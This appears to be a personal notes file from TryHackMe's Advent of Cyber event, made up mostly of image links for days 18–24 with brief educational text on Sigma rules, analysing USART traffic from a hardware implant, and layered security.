+- ![Purifier Example](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/f66f8bfc285d5d43cfcaea4834ff6adb.png)
+- ![Task banner for day 18](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/ad32970704bf0d7932de3b91a747afa6.png)
+- ![Sigma Rule Structure](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/ab03bb7d76129d0b7b20bd5b5120a553.png)Sigma rules are guided by a given order of required/optional fields and values that create the structure for mapping needed queries. The attached image provides a skeletal view of a Sigma rule.
+- ![Lumberjack Lenny using Sigma](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/f0038fa25297d00d5cfe84bd01440ea9.png)
+- ![banner](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/be03eb084bea3df807aeac9a7029d533.png)
+- ![logicanalyser](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/39e34851adce2e5394fcd45bf06eb40f.png)
+- ![USART comms](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/b1c981a472ba20b8cfa63b8b979ab156.png)
+- ![SPI comms](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d2a62b649df7a735b95ba79e9c607983.png)
+- ![SPI multiple comms](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/55b41ceb83ddf1ebe0fa6b89f93658f8.png)
+- ![I2C comms](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/cd478aa5322feda6199648ee392f36fc.png)
+- ![I2C comms](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/ce2b96adbbde1dcbc69dbf29eb027733.png)
+- ![Circuit](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/e44bd191ed7226c3108d13cd783e69fd.png)
+- ![Circuit](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/27be15b945182af1b52c3ad032a07bb6.png)Based on the diagram, it seems like there is a microprocessor that is connected to an ESP32 chip. Doing some research, we can see that the ESP32 chips allow microprocessors to communicate over WiFi and Mobile networks. So whatever this implant was doing, it was definitely communicating with someone else. If we can intercept the communication between the microprocessor and the ESP32 chip, we would be able to see what commands and information are being sent. It seems like the perfect opportunity for our red and blue team to team up! Elf Forensic and Elf Recon are on the job!
+- ![Circuit](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/4e0dd79d20706e8df0ab5af1f1ae2167.png)The elves realise that these chips probably use digital communication that can be intercepted with a Logic Analyser. Looking at the wires between the chips, we see a black wire connected to a pin called GND and a red wire connected to a pin called VIN. Elf Forensic knows from experience that this would be the Ground and Voltage IN wires, respectively, meaning these wires are used to provide power to the chip. That then leaves the green and purple wires that would be used for data transmission. Seeing that they are connected to the RX0 and TX0 pins, Elf Recon can deduce that this refers to the Transmit and Receive lines of USART communication. Hence we are pretty sure that the protocol used for communication is USART. Armed with this information, the elves connect the probes of the Logic Analyser to the green and purple wires before powering on the implant. Immediately, super-fast signals are seen on the analyser! The elves create a logic data dump from the signals, and McSkidy is asking you to investigate what is actually being transmitted!
+- ![Logic data](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/0ed920bc192a7ba8edffaf823c94f3cd.png)
+- ![Logic data](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/4e0c2eb28242876c7cafd2cd8c262e5d.png)
+- ![Logic data](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c325939f530996de4bc535e256599bfd.png)
+- ![logic data](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/f7ad8d25ec5178c39457cc1d98f6aef6.png)
+- ![logic data](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/39216ec75845438168a567b970d13ff0.png)
+- ![logic data](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/f6b580f9bf181ce63a342558a7d4774c.png)
+- ![logic data](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/5d377564abf7d61b3ea9f502e3d65498.png)
+- ![logic data](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/456cc627b945f3b2c5ddaf47b8f23c50.png)
+- ![logic data](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/21b5fc616ae245fb42dd7a7e0532bc0b.png)
+- ![Image for banner](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/b9d0777ff1cdcf114124a035dd4cecc4.png)
+- ![Task banner for day 21](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/b6bf90fa41691cf902d80ca62eff81fd.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/3db4fb129fb5cbfe9c34d9d092d6bf19.png)
+- ![Diagram of middleware translating data between client A and client B](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/495796497ee8356484689b008de96184.png)
+- ![Diagram of a broker facilitating the communication between a publisher and subscriber](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/9af9a374b9401e1f61d200240752c012.png)
+- ![Diagram of multiple publishers sending messages with topics to a single broker](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/bc178e6c7cf7ad59bafa6029a4dc006e.png)
+- ![Diagram of multiple subscribers requesting messages from several topics from a single broker](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/a8df1ae7f4eafc5aee7cec79e195c71d.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/86c6456b29440fe8c7318f6d28c6d99f.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/fbce96757ec751ebe2893a9f4eef0322.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/f8718ce9f1f93a9fa01ce70eed9d0be0.png)
+- ![Banner image showing a Christmas tree branch with the number 22 and different types of Christmas Candy](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/de458d6095e39ca645b5eac109ca1a5b.png)
+### Attack Vectors![An image showing the Bandit Yeti wielding a candy as a weapon. The weapon is marked as attack vector](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/6bcf4931e66fb13c1bdb493e0e4fe354.png)
+### Attack Surface![An image showing a Blue Team Elf in armor and with a shield. The unshielded part of the Elf's body is marked as Attack surface](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/5dd98afd83d1a5dae96af3bc9701cdd4.png)
+- ![An image showing Blue team Elfs in a close Greek Phalanx formation, surrounded by mountains, showing a reduced attack surface due to shields in the front and mountains on the side](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/438752f129cb45eb534bcccd6809806b.png)
+- ![Banner for Day 23](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/4efae3f1894e77bb72afcd58791b2961.png)
+- ![Security Elf](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/fb56361ab25a143e789048eb19f62860.png)For the longest time, and maybe even until today, a lot of organisations have looked at their security posture in the same way medieval lords did: a strong focus on securing the castle walls - the perimeter, so to speak. However, like medieval lords, after the perimeter is breached and depending on the organisation’s response, it’s pretty much done for them too.
+- ![Bandit Yeti: Abominable for a Day](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/9c4b9cf210bca525421b44a0ac19cd7a.png)
+- ![Banner image showing a Christmas garland with the number 24 and different ornaments including a candy-cane question mark a medal a survey notepad and a finish line](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/1cac385aec8b539fbcb2841e4f72edae.png)
+- ![McSkidy watches Santa's sleigh taking off while drinking hot chocolate](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/94830bff9ac15e679a41d820b4414e82.png)
+- ![McSkidy walks through Santa's workshop while other elves go about their pending tasks](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/986c561fe48ff1bcd73f0fd2e4a24b8b.png)
+- ![The Bandit Yeti walks away from Santa's compund](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/03eb8181e1c70490027eba487ed0a092.png)
+- ![The Bandit Yeti tears down the board with his 2022 evil plan](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/248aec616890f5b7727a41d70e08fc32.png)
+- ![The Yeti crosses out 2022 and writes 2023 to start off planning for next year](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/a8064e6db7bb810884ac871b79cab65d.png)
+- ![McSkidy enters the SOC room](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/90602a5c3976a61dbfa12ec75b0157ea.png)
+- ![McSkidy unrolls the scroll with the security to-do list](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/ec1548addd9ede507fcfbf486353a602.png)
+- ![McSkidy crosses out the Save Christmas item off the list](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/aeb03cb85124ffcc48ba73c9ba8334f6.png)
+- ![McSkidy and the whole Elf team celebrate victory with a nice Christmas meal](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/99ebd7040adfbed402e526a9e2f15a68.png)
+
+## Notes / Lessons Learned
+_Hey,_
+_This task is a bit more complex than what you have seen so far in the event. We’ve ensured the task content has all the information you need. However, as there are many moving parts to getting it to work, it might prove challenging. Worry not! We have plenty of resources to help you out._
+_Linked above is a video walkthrough of the challenge, recorded by Alh4zr3d. It includes a thorough explanation, comprehensive instruction, valuable hints, analogies, and a complete guide to answering all the questions. Use it!_
+_If you need more, [visit us on Discord](https://discord.gg/tryhackme)! We have a dedicated channel for Advent of Cyber, with staff on call and a very supportive community to help with all your questions and doubts._
+_You got this! See you tomorrow - Elf McSkidy will need your help more than ever._
+_With love,_
+_The TryHackMe Team_
+[[Intro to Malware Analysis]]
+
